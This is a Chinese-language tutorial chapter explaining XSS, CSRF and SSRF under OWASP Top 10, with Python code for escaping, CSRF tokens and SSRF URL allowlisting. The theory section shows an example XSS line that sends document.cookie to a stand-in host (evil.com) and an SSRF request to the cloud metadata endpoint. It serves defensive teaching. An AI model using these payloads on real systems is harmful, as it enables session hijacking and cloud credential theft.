# OWASP、XSS / CSRF / SSRF

> **OWASP Top 10** 是 Web 安全的「最常見致命漏洞」清單，每個後端工程師都該熟。這章聚焦三個經典的注入/偽造類漏洞——**XSS（跨站腳本）、CSRF（跨站請求偽造）、SSRF（伺服器端請求偽造）**——它們的原理、危害與防禦。

## Why（為什麼）

**OWASP（Open Web Application Security Project）Top 10** 是業界公認的 Web 應用最嚴重風險清單（每幾年更新），涵蓋：broken access control（見 [授權](03-authn-authz.md)）、injection（見 [注入](02-injection.md)）、加密失效、安全設定錯誤、脆弱組件（見 [供應鏈](06-supply-chain.md)）、SSRF 等。它是資安面試與實務的共同語言——「你知道 OWASP Top 10 嗎」幾乎是後端資安的入門考題。

這章聚焦其中三個「**偽造/注入**」類的經典漏洞，它們常被搞混但機制不同：

- **XSS（Cross-Site Scripting，跨站腳本）**：攻擊者把**惡意 JavaScript 注入你的網頁**，在其他使用者的瀏覽器執行——偷 cookie、冒充操作。本質是「[注入](02-injection.md)」在 HTML/JS 情境的變體。
- **CSRF（Cross-Site Request Forgery，跨站請求偽造）**：誘騙**已登入**的使用者，在不知情下向你的網站發出**惡意請求**（如轉帳）——利用瀏覽器自動帶 cookie 的特性。
- **SSRF（Server-Side Request Forgery，伺服器端請求偽造）**：誘騙**你的伺服器**去請求攻擊者指定的位址——存取內網服務、雲端 metadata（偷憑證）。

三者都源於「信任了不該信任的東西」，防禦各有要點。這章講清楚。

## Theory（理論：三種偽造的機制）

**XSS——注入惡意腳本到頁面**。若你把使用者輸入**未經逃逸**就塞進 HTML：

```python
html = f"<div>留言：{user_comment}</div>"   # 🔴 若 comment 是 <script>steal()</script>
```

使用者輸入 `<script>fetch('evil.com?c='+document.cookie)</script>`，被當成真的 `<script>` 標籤，在**其他瀏覽者**的頁面執行——偷走他們的 cookie/session。類型：**stored（存進 DB 再顯示給眾人）、reflected（從 URL 參數反射回頁面）、DOM-based**。防禦本質同注入：**輸出時針對 HTML 情境逃逸**。

**CSRF——盜用已登入身分發請求**。瀏覽器有個特性：向某網站發請求時，**自動帶上該網站的 cookie**（含 session）。攻擊者做一個惡意頁面，內含 `<form action="https://yourbank.com/transfer" method="POST">` 自動提交；受害者（已登入 yourbank）一訪問惡意頁，瀏覽器就帶著他的 session cookie 發出轉帳請求——伺服器以為是本人操作。關鍵：**攻擊者不需要知道 cookie，只是利用瀏覽器自動帶上**。防禦：**CSRF token**（一個攻擊者無法預知的隨機值）、**SameSite cookie**。

**SSRF——讓伺服器替攻擊者發請求**。若你的伺服器接受使用者提供的 URL 去抓取（如「輸入圖片網址，我幫你下載」）：

```python
requests.get(user_provided_url)   # 🔴 若 url 是 http://169.254.169.254/...
```

攻擊者給 `http://169.254.169.254/latest/meta-data/`（雲端 metadata 端點）——你的伺服器（在雲內、有權限）去請求，回傳**雲端憑證**給攻擊者。或給 `http://internal-admin:8080/` 存取本該不對外的內網服務。關鍵：**伺服器的網路位置和權限被濫用**。防禦：**URL allowlist、禁止內網位址、禁用重導**。

## Specification（規範：三種防禦）

**XSS 防禦——輸出逃逸 + CSP**：

```python
import html
safe = html.escape(user_comment)   # < > & " ' → &lt; &gt; ... 失去 HTML 意義
# 模板引擎（Jinja2）預設自動逃逸——別關掉、別用 |safe 於不可信內容
```

- **模板自動逃逸**：Jinja2/Django 模板預設對變數逃逸——**保持開啟**。
- **CSP（Content-Security-Policy）header**：限制頁面能載入/執行哪些來源的腳本，縱深防禦。
- **cookie 設 `HttpOnly`**：JS 讀不到 cookie，就算 XSS 也偷不走 session。

**CSRF 防禦——token + SameSite**：

```python
import secrets
csrf_token = secrets.token_urlsafe(32)   # 每 session/表單一個不可預測的 token
# 表單提交時帶上，伺服器比對；不符則拒絕（攻擊者無法預知此 token）
# cookie 設 SameSite=Lax/Strict：跨站請求不帶 cookie
```

- **CSRF token**：伺服器發、表單帶回、比對——攻擊者的惡意頁面拿不到這個 token。
- **SameSite cookie**：`Lax`/`Strict` 讓跨站請求不自動帶 cookie，從根本擋住。
- **對「改變狀態」的操作用 POST/PUT/DELETE**（別用 GET 做轉帳），並檢查 token。

**SSRF 防禦——allowlist + 封鎖內網**：

```python
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url: str, allowed_hosts: set[str]) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    if parsed.hostname not in allowed_hosts:   # allowlist
        return False
    return True
# 並解析 IP、封鎖私有/loopback/link-local(169.254.169.254)、禁用重導
```

## Implementation（底層：為何這些防禦有效）

**XSS 逃逸的本質**：`html.escape` 把 `<`→`&lt;`、`>`→`&gt;`、`&`→`&amp;` 等。逃逸後，`<script>` 變成 `&lt;script&gt;`——瀏覽器顯示成**文字**「<script>」，而**不當成標籤解析執行**。這就切斷了「使用者輸入變成可執行程式碼」的路徑。關鍵是**在輸出（放進 HTML）的當下、針對 HTML 情境逃逸**——同一份輸入放進 HTML 屬性、JS、URL 各需不同逃逸（見 [輸入驗證](01-input-validation.md) 的「逃逸在輸出、情境相依」）。

**CSRF token 為何有效**：CSRF 攻擊的前提是「攻擊者能讓瀏覽器發出**可預測**的請求」。CSRF token 是一個**綁定 session 的隨機值**，只存在於你的合法頁面裡。攻擊者的惡意頁面**讀不到**這個 token（同源政策擋著，他在別的網域），所以偽造的請求**帶不出正確 token** → 伺服器比對失敗 → 拒絕。SameSite cookie 更直接——瀏覽器對跨站請求根本不帶你的 cookie，攻擊者連「盜用已登入身分」的前提都沒了。

**SSRF 為何危險、allowlist 為何必要**：伺服器通常位於**受信任的網路內部**、且**帶著權限**（雲 IAM、內網存取權）。SSRF 讓攻擊者「借用」伺服器的網路位置與權限去打**他自己碰不到的目標**——雲 metadata 端點（`169.254.169.254`，回傳臨時憑證）、內網管理介面、其他內部服務。防禦不能只靠 denylist（封鎖已知壞位址），因為有太多繞過（DNS rebinding、重導到內網、IPv6、十進位 IP 表示法）。**allowlist（只允許明確可信的目標）** 才可靠，並要**解析最終 IP、封鎖私有/loopback/link-local 網段、禁用自動重導**（防重導繞過）。

## Code Example（可執行的 Python 範例）

```python
# owasp_demo.py — XSS 逃逸 / CSRF token / SSRF allowlist（純標準庫，可執行）
from __future__ import annotations

import html
import ipaddress
import secrets
import socket
from urllib.parse import urlparse


# --- XSS：輸出逃逸 ---
def render_comment(comment: str) -> str:
    """把使用者留言安全地放進 HTML（逃逸防 XSS）。"""
    return f"<div>留言：{html.escape(comment)}</div>"


# --- CSRF：token 產生與驗證 ---
def new_csrf_token() -> str:
    return secrets.token_urlsafe(32)  # 不可預測


def check_csrf(session_token: str, form_token: str) -> bool:
    """定時比較，攻擊者的偽造請求帶不出正確 token。"""
    return secrets.compare_digest(session_token, form_token)


# --- SSRF：URL allowlist + 封鎖內網 ---
def is_safe_fetch_url(url: str, allowed_hosts: set[str]) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or parsed.hostname is None:
        return False
    if parsed.hostname not in allowed_hosts:  # allowlist
        return False
    try:  # 解析 IP，封鎖私有/loopback/link-local（如雲 metadata 169.254.x）
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    except (socket.gaierror, ValueError):
        return False
    return not (ip.is_private or ip.is_loopback or ip.is_link_local)


def main() -> None:
    # XSS：惡意腳本被逃逸成純文字
    evil = "<script>steal(document.cookie)</script>"
    print("XSS 逃逸:")
    print(f"  {render_comment(evil)}")

    # CSRF：正確 token 通過、偽造 token 被擋
    token = new_csrf_token()
    print("\nCSRF token:")
    print(f"  合法表單(正確 token): {check_csrf(token, token)}")
    print(f"  偽造請求(錯誤 token): {check_csrf(token, 'attacker-guess')}")

    # SSRF：只允許 allowlist、封鎖內網/metadata
    allow = {"api.example.com"}
    print("\nSSRF allowlist:")
    for url in [
        "https://api.example.com/data",
        "http://169.254.169.254/latest/meta-data/",  # 雲 metadata（偷憑證）
        "http://localhost:8080/admin",  # 內網
    ]:
        print(f"  {url[:45]:45} → {'允許' if is_safe_fetch_url(url, allow) else '拒絕'}")


if __name__ == "__main__":
    main()
```

**預期輸出**：

```pycon
$ python owasp_demo.py
XSS 逃逸:
  <div>留言：&lt;script&gt;steal(document.cookie)&lt;/script&gt;</div>

CSRF token:
  合法表單(正確 token): True
  偽造請求(錯誤 token): False

SSRF allowlist:
  https://api.example.com/data                  → 允許
  http://169.254.169.254/latest/meta-data/      → 拒絕
  http://localhost:8080/admin                   → 拒絕
```

逐段解說：

- **XSS**：`html.escape` 把 `<script>` 變成 `&lt;script&gt;`——瀏覽器顯示成文字，**不執行**。惡意腳本注入被切斷。
- **CSRF**：`check_csrf` 用定時比較驗證 token。合法表單帶著伺服器發的 token → 通過；攻擊者的偽造請求猜不到 token → 被擋（`False`）。攻擊者的惡意頁面讀不到這個 session 綁定的隨機 token。
- **SSRF**：`is_safe_fetch_url` 用 allowlist（只允許 `api.example.com`）+ 解析 IP 封鎖內網/loopback/link-local。`api.example.com` 允許；雲 metadata（`169.254.169.254`，link-local）和 `localhost`（loopback）都被拒——擋下「借伺服器去打內網/偷憑證」。
- **要點**：XSS 靠輸出逃逸、CSRF 靠不可預測 token、SSRF 靠 allowlist + 封鎖內網——三種偽造各有對症的防禦。

## Diagram（圖解：三種攻擊的方向）

```mermaid
flowchart TD
    subgraph XSS
        X1["攻擊者注入 script 到頁面"] --> X2["其他使用者瀏覽器執行<br/>→ 偷 cookie"]
        X2 -.防禦.-> XD["輸出逃逸 + CSP + HttpOnly"]
    end
    subgraph CSRF
        C1["誘騙已登入使用者訪問惡意頁"] --> C2["瀏覽器自動帶 cookie 發請求<br/>→ 冒名操作"]
        C2 -.防禦.-> CD["CSRF token + SameSite cookie"]
    end
    subgraph SSRF
        S1["使用者提供惡意 URL"] --> S2["伺服器去請求內網/metadata<br/>→ 偷憑證/存取內網"]
        S2 -.防禦.-> SD["URL allowlist + 封鎖內網"]
    end
    style XD fill:#e8f5e9
    style CD fill:#e8f5e9
    style SD fill:#e8f5e9
```



## Best Practice（最佳實踐）

- **XSS：輸出時逃逸（情境相依）**，用模板自動逃逸（別關）、設 CSP、cookie `HttpOnly`。
- **CSRF：用 CSRF token + SameSite cookie**，狀態變更操作用 POST 並驗 token。
- **SSRF：URL allowlist + 封鎖私有/loopback/link-local + 禁用自動重導**。
- **cookie 三件套**：`HttpOnly`（防 XSS 偷）、`Secure`（只走 HTTPS）、`SameSite`（防 CSRF）。
- **全站 HTTPS**：防竊聽與中間人（見 [JWT](04-jwt.md)）。
- **熟悉並定期對照 OWASP Top 10**：把它當自查清單。
- **縱深防禦**：逃逸 + CSP + 驗證 + allowlist 疊加，別靠單一手段。
- **用框架內建防護**（FastAPI/Django 的 CSRF、模板逃逸），別自己重造。

## Common Mistakes（常見誤解）

- **XSS：手動拼 HTML 不逃逸、或用 `|safe`/`mark_safe` 於不可信內容**：注入大門。
- **只做輸入驗證不做輸出逃逸**：以為擋在入口就好，但逃逸必須在輸出、依情境。
- **CSRF：用 GET 做狀態變更**（`GET /transfer?to=x`）：一個 `` 就能觸發。
- **CSRF：沒有 token 也沒 SameSite**：登入使用者被跨站偽造請求。
- **SSRF：用 denylist 擋內網**：太多繞過（DNS rebinding、十進位 IP、重導）；用 allowlist。
- **SSRF：驗證了 URL 卻允許自動重導**：先過驗證再重導到內網繞過。
- **cookie 沒設 HttpOnly**：XSS 就能偷走 session。
- **關掉模板自動逃逸**：圖方便卻開了 XSS 洞。

## Interview Notes（面試重點）

- **能區分 XSS / CSRF / SSRF 的機制與方向**：注入腳本到頁面 / 盜用已登入身分發請求 / 讓伺服器替攻擊者發請求。
- **XSS：知道防禦是「輸出逃逸（情境相依）+ CSP + HttpOnly cookie」**，且區分 stored/reflected/DOM。
- **CSRF：能解釋「瀏覽器自動帶 cookie」的前提，以及 token 與 SameSite 為何有效**（攻擊者讀不到 token）。
- **SSRF：知道危害（偷雲憑證 169.254.169.254、打內網）與防禦（allowlist + 封鎖內網 + 禁重導）**，以及為何 denylist 不夠。
- **知道 cookie 的 HttpOnly/Secure/SameSite 三屬性各防什麼**。
- **熟悉 OWASP Top 10 作為資安自查清單**，並能連結到注入、授權等章。

---

➡️ 下一章：[密碼雜湊 (bcrypt / argon2)](08-password-hashing.md)

[⬆️ 回 Part 20 索引](README.md)
